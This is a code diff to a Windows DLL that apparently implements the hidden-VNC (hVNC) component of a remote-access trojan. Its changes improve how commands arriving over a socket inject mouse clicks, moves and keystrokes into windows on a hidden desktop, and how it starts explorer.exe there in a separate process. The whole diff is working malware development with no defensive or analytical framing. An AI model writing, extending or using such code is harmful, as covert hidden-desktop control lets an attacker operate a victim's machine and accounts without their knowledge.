@@ -337,16 +337,23 @@ static void input_loop() {
         int y = (task.cmd.value("y", 0) * sh) / 65535;
         POINT pt = {x, y};
 
+        SetCursorPos(x, y);
         HWND hwnd = WindowFromPoint(pt);
         if (!hwnd) continue;
 
-        if (task.action.find("hvnc_mouse") != string::npos) {
+        if (task.action.find("hvnc_mouse") != string::npos || task.action == "hvnc_doubleclick") {
             LRESULT hitTest = SendMessageW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(x, y));
             UINT msg = 0;
             WPARAM wParam = 0;
 
             if (task.action == "hvnc_mousemove") {
-                PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(x, y));
+                if (hitTest != HTCLIENT) {
+                    PostMessageW(hwnd, WM_NCMOUSEMOVE, hitTest, MAKELPARAM(x, y));
+                } else {
+                    POINT clientPt = pt;
+                    ScreenToClient(hwnd, &clientPt);
+                    PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(clientPt.x, clientPt.y));
+                }
                 PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(hitTest, WM_MOUSEMOVE));
             } else if (task.action == "hvnc_doubleclick") {
                 int btn = task.cmd.value("button", 0);
@@ -373,15 +380,6 @@ static void input_loop() {
                         if (btn == 0) {
                             if (hitTest == HTCAPTION) {
                                 PostMessageW(hwnd, WM_SYSCOMMAND, SC_MOVE + 2, MAKELPARAM(x, y));
-                                continue;
-                            } else if (hitTest == HTCLOSE) {
-                                PostMessageW(hwnd, WM_SYSCOMMAND, SC_CLOSE, MAKELPARAM(x, y));
-                                continue;
-                            } else if (hitTest == HTMINBUTTON) {
-                                PostMessageW(hwnd, WM_SYSCOMMAND, SC_MINIMIZE, MAKELPARAM(x, y));
-                                continue;
-                            } else if (hitTest == HTMAXBUTTON) {
-                                PostMessageW(hwnd, WM_SYSCOMMAND, SC_MAXIMIZE, MAKELPARAM(x, y));
                                 continue;
                             }
                         }
@@ -441,13 +439,17 @@ static void input_loop() {
             }
             if (!hFocus) hFocus = hwnd;
 
+            LPARAM lParam = 1;
+            UINT scanCode = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
+            lParam |= (scanCode << 16);
             if (task.action == "hvnc_keydown") {
-                PostMessageW(hFocus, WM_KEYDOWN, vk, 0);
+                PostMessageW(hFocus, WM_KEYDOWN, vk, lParam);
                 if ((vk >= 0x30 && vk <= 0x39) || (vk >= 0x41 && vk <= 0x5A) || vk == VK_SPACE || vk == VK_RETURN || vk == VK_BACK) {
-                    PostMessageW(hFocus, WM_CHAR, vk, 0);
+                    PostMessageW(hFocus, WM_CHAR, vk, lParam);
                 }
             } else {
-                PostMessageW(hFocus, WM_KEYUP, vk, 0);
+                lParam |= 0xC0000000;
+                PostMessageW(hFocus, WM_KEYUP, vk, lParam);
             }
         }
     }
@@ -497,6 +499,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             if (!g_hHiddenDesktop) return;
 
             wstring path = utf8_to_wstring(cmd.value("path", "cmd.exe"));
+            if (path.find(L"explorer.exe") != wstring::npos) {
+                path += L" /separate";
+            }
             vector<wchar_t> cmdLine(path.begin(), path.end());
             cmdLine.push_back(L'\0');
 
